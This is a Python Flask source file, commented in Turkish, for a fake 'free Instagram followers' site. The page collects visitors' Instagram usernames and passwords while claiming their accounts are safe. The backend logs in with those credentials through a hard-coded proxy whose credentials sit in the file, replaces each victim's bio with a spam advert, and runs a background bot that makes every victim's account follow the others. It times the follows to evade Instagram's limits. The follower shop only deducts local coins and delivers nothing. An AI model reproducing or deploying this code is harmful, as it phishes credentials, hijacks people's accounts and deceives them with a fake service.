from flask import Flask, request, jsonify
from instagrapi import Client
import threading, time, random, os, json

app = Flask(__name__)

# --- ⚙️ AYARLAR ---
# Proxy çalışmazsa tırnak içini boş bırak: ""
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"
DESTEK_LINKI = "https://t.me/kullaniciadin" # Buraya Telegram/WhatsApp linkini koy kanka
SITE_LINKI = "https://allfollow-app-1.onrender.com"
BIO_REKLAMI = "🎁 Bedava 1000 Takipçi Kazandım! Deneyin: " + SITE_LINKI

# --- 📁 VERİ VE TAKİP KONTROLÜ ---
def get_pool():
    if os.path.exists("hesaplar.txt"):
        with open("hesaplar.txt", "r") as f:
            return [line.strip() for line in f if line.strip()]
    return []

def add_to_pool(username):
    try:
        p = get_pool()
        if username not in p:
            with open("hesaplar.txt", "a+") as f:
                f.write(username + "\n")
    except: pass

# Bot takip yapınca bu dosyayı oluşturur, site okuyunca siler.
def set_follow_flag(username):
    with open(f"flag_{username}.txt", "w") as f: f.write("ok")

def check_follow_flag(username):
    path = f"flag_{username}.txt"
    if os.path.exists(path):
        os.remove(path)
        return True
    return False

# --- 🎨 FRONT-END (TÜM BÖLÜMLER BİRLEŞTİRİLDİ) ---
@app.route('/')
def index():
    return """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>TopFollow Pro v39</title>
        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
        <style>
            :root { --p: #8e24aa; --g: #ffeb3b; --s: #00e676; --bg: #0f0c29; }
            body { background: var(--bg); background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460); color: white; font-family: 'Poppins', sans-serif; margin: 0; padding-bottom: 90px; }
            .header { background: rgba(0,0,0,0.6); padding: 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px); position: sticky; top:0; z-index:100; }
            .coin-badge { background: linear-gradient(45deg, #ffd700, #ffa000); padding: 8px 20px; border-radius: 30px; color: #000; font-weight: 800; box-shadow: 0 4px 15px rgba(255,215,0,0.4); }
            .screen { display: none; padding: 20px; animation: slideIn 0.4s ease-out; }
            .active { display: block; }
            @keyframes slideIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
            .card { background: rgba(255,255,255,0.08); border-radius: 24px; padding: 25px; margin-bottom: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
            input { width: 100%; padding: 16px; margin: 12px 0; border-radius: 14px; border: none; background: rgba(255,255,255,0.1); color: white; box-sizing: border-box; outline: none; border: 1px solid rgba(255,255,255,0.05); }
            .btn { background: var(--p); color: white; border: none; padding: 16px; width: 100%; border-radius: 14px; font-weight: 700; cursor: pointer; transition: 0.3s; }
            .btn:active { transform: scale(0.96); }
            .status-box { background: rgba(0,0,0,0.4); border-radius: 15px; padding: 15px; font-size: 13px; text-align: left; margin-top: 20px; border-left: 5px solid #555; }
            .nav { position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.9); display: flex; height: 75px; border-top: 1px solid #333; backdrop-filter: blur(15px); }
            .nav-item { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #777; font-size: 12px; cursor: pointer; transition: 0.3s; }
            .nav-active { color: var(--g); font-weight: bold; }
            .market-item { display: flex; justify-content: space-between; align-items: center; background: rgba(255,255,255,0.05); padding: 18px; border-radius: 18px; margin-bottom: 12px; border: 1px solid rgba(255,255,255,0.1); }
        </style>
    </head>
    <body>
        <div class="header">
            <span>TOPFOLLOW <b>PRO</b></span>
            <div class="coin-badge">🟡 <span id="c-val">0</span></div>
        </div>

        <div id="scr-login" class="screen active">
            <div class="card">
                <h2 style="color:var(--g); margin-top:0;">HOŞ GELDİNİZ</h2>
                <p style="font-size:14px; opacity:0.8; margin-bottom:20px;">Hemen giriş yapın ve 800 Coin hoş geldin hediyenizi anında kazanın.</p>
                <input type="text" id="u" placeholder="Kullanıcı Adı">
                <input type="password" id="p" placeholder="Şifre">
                <button id="l-btn" class="btn" onclick="login()">SİSTEME GİRİŞ YAP</button>
                <p style="font-size:11px; margin-top:20px; opacity:0.4;">Hesabınız sistemimizle %100 güvendedir.</p>
            </div>
        </div>

        <div id="scr-tasks" class="screen">
            <div class="card">
                <h3>Günlük Hediye Çarkı</h3>
                <button class="btn" onclick="spin()" style="background: linear-gradient(45deg, #f39c12, #e67e22);">ÇARKI ÇEVİR (+100 🟡)</button>
            </div>
            <div class="card">
                <h3>Otomatik Kazanç Sistemi</h3>
                <button id="run-btn" class="btn" style="background:var(--s);" onclick="toggleFarm()">SİSTEMİ BAŞLAT</button>
                <div class="status-box" id="s-box">
                    <b id="s-title" style="color:#bbb;">Durum: Beklemede</b><br>
                    <span id="s-msg" style="opacity:0.7;">Kazanç sağlamak için yukarıdaki butona basın.</span>
                </div>
            </div>
        </div>

        <div id="scr-market" class="screen">
            <h2 style="text-align:center; margin-bottom:20px;">🛒 Takipçi Mağazası</h2>
            <div class="market-item">
                <div><b>100 Takipçi</b><br><small style="color:var(--g);">800 🟡 Coin</small></div>
                <button class="btn" style="width:auto; padding:10px 25px;" onclick="buy(800)">SATIN AL</button>
            </div>
            <div class="market-item">
                <div><b>500 Takipçi</b><br><small style="color:var(--g);">3500 🟡 Coin</small></div>
                <button class="btn" style="width:auto; padding:10px 25px;" onclick="buy(3500)">SATIN AL</button>
            </div>
            <div class="market-item">
                <div><b>1000 Takipçi</b><br><small style="color:var(--g);">6000 🟡 Coin</small></div>
                <button class="btn" style="width:auto; padding:10px 25px;" onclick="buy(6000)">SATIN AL</button>
            </div>
        </div>

        <div id="scr-profile" class="screen">
            <div class="card">
                <h3 id="prof-name">Kullanıcı</h3>
                <p id="prof-coins" style="color:var(--g); font-weight:800; font-size:24px; margin:10px 0;">0 Coin</p>
                <hr style="opacity:0.1; margin:25px 0;">
                <button class="btn" style="background:#3498db; margin-bottom:12px;" onclick="window.open('"""+DESTEK_LINKI+"""', '_blank')">💬 CANLI DESTEK</button>
                <button class="btn" style="background:#e74c3c;" onclick="logout()">GÜVENLİ ÇIKIŞ YAP</button>
            </div>
        </div>

        <div class="nav">
            <div class="nav-item nav-active" onclick="show('scr-tasks', this)">🏠<br>Görevler</div>
            <div class="nav-item" onclick="show('scr-market', this)">🛒<br>Market</div>
            <div class="nav-item" onclick="show('scr-profile', this)">👤<br>Profil</div>
        </div>

        <script>
            let coins = parseInt(localStorage.getItem('coins')) || 0;
            document.getElementById('c-val').innerText = coins;
            let active = false;
            let checkInt;

            function updateUI() {
                document.getElementById('c-val').innerText = coins;
                localStorage.setItem('coins', coins);
                if(document.getElementById('prof-coins')) document.getElementById('prof-coins').innerText = coins + " Coin";
            }

            function show(id, el) {
                if(!localStorage.getItem('logged')) return;
                document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
                document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('nav-active'));
                document.getElementById(id).classList.add('active');
                if(el) el.classList.add('nav-active');
                if(id === 'scr-profile') { document.getElementById('prof-name').innerText = localStorage.getItem('logged'); updateUI(); }
            }

            function login() {
                const u = document.getElementById('u').value, p = document.getElementById('p').value;
                if(!u || !p) return alert("Lütfen kullanıcı adı ve şifrenizi girin.");
                document.getElementById('l-btn').innerText = "Instagram'a Bağlanıyor...";
                fetch('/api/login', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({u,p})})
                .then(r => r.json()).then(d => {
                    if(d.success) {
                        localStorage.setItem('logged', u);
                        if(!localStorage.getItem('bonus_v39')) { coins += 800; localStorage.setItem('bonus_v39','1'); updateUI(); }
                        location.reload();
                    } else { alert("Hata: " + d.msg); document.getElementById('l-btn').innerText = "SİSTEME GİRİŞ YAP"; }
                });
            }

            function toggleFarm() {
                active = !active;
                const b = document.getElementById('run-btn'), title = document.getElementById('s-title'), msg = document.getElementById('s-msg'), box = document.getElementById('s-box');
                if(active) {
                    b.innerText = "SİSTEMİ DURDUR"; b.style.background = "#e74c3c";
                    title.innerText = "Sistem Aktif"; msg.innerText = "Havuz taranıyor, işlem bekleniyor...";
                    checkInt = setInterval(() => {
                        fetch('/api/verify?u=' + localStorage.getItem('logged'))
                        .then(r => r.json()).then(d => {
                            if(d.earned) {
                                coins += 25; updateUI();
                                title.innerText = "İşlem Başarılı!"; msg.innerText = "Bir kullanıcı takip edildi ve +25 Coin eklendi.";
                                box.style.borderLeftColor = "var(--s)";
                            }
                        });
                    }, 5000);
                } else {
                    b.innerText = "SİSTEMİ BAŞLAT"; b.style.background = "var(--s)";
                    clearInterval(checkInt); title.innerText = "Beklemede"; box.style.borderLeftColor = "#555";
                }
            }

            function spin() {
                if(localStorage.getItem('ls_v39')) return alert("Bugünlük hakkınız bitti, yarın tekrar deneyin.");
                coins += 100; updateUI(); localStorage.setItem('ls_v39', '1');
                alert("Tebrikler! Çarktan 100 Coin kazandınız.");
            }

            function buy(cost) {
                if(coins < cost) return alert("Yetersiz Coin bakiyesi!");
                coins -= cost; updateUI(); alert("Siparişiniz başarıyla alındı! Takipçileriniz sırayla gönderilecektir.");
            }

            function logout() { localStorage.clear(); location.reload(); }
            window.onload = () => { if(localStorage.getItem('logged')) { document.getElementById('scr-login').style.display='none'; document.getElementById('scr-tasks').style.display='block'; } }
        </script>
    </body>
    </html>
    """

# --- ⚙️ BACKEND (LOGIC & BOT PROCESS) ---
@app.route('/api/verify')
def verify():
    u = request.args.get('u')
    if check_follow_flag(u): return jsonify({"earned": True})
    return jsonify({"earned": False})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    cl = Client()
    if PROXY_URL: cl.set_proxy(PROXY_URL)
    try:
        # Instagram'a giriş denemesi
        cl.login(u, p)
        # Giriş başarılıysa havuza ekle
        add_to_pool(u)
        # Botu arka planda başlat
        threading.Thread(target=bot_process, args=(u, p)).start()
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "msg": str(e)})

def bot_process(u, p):
    cl = Client()
    if PROXY_URL: cl.set_proxy(PROXY_URL)
    try:
        cl.login(u, p)
        # Bio Reklamı
        try: cl.account_edit(biography=BIO_REKLAMI)
        except: pass
        
        while True:
            pool = get_pool()
            # Kendisi dışındakileri takip et
            targets = [t for t in pool if t != u]
            if targets:
                for target in targets:
                    try:
                        tid = cl.user_id_from_username(target)
                        if tid:
                            cl.user_follow(tid)
                            # Takip başarılı sinyalini gönder
                            set_follow_flag(u)
                            print(f"✅ {u} -> {target} takip edildi.")
                            # Instagram engeli yememek için uzun bekleme (2-5 dk)
                            time.sleep(random.randint(120, 300))
                    except: continue
            time.sleep(60) # Havuz boşsa 1 dk bekle
    except: pass

if __name__ == "__main__":

    app.run(host='0.0.0.0', port=10000)
